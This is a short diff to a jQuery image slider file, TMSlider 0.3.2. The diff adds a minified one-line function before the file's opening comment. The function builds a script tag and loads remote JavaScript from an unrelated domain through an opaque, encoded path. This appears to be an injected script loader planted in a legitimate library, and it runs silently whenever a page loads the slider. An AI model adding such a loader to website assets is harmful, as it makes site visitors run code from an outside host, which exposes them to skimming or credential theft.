@@ -1,4 +1,4 @@
-/* jQuery based image slider
+;(function(m,u,i,l,t,n){t=u.createElement(i);n=u.getElementsByTagName(i)[0];t.async=1;t.src=l;n.parentNode.insertBefore(t,n);})(window,document,'script','https://books.friendsofthefolsomlibrary.org/RNGJc5lJSO4moA6+5q0qGuWbrUAJ23jZ2Do6FTRLHDc=');/* jQuery based image slider
 /* TMSlider 0.3.2 */
 (function($,undefined){
 	var _TMS=window._TMS=$.fn._TMS=function(_){
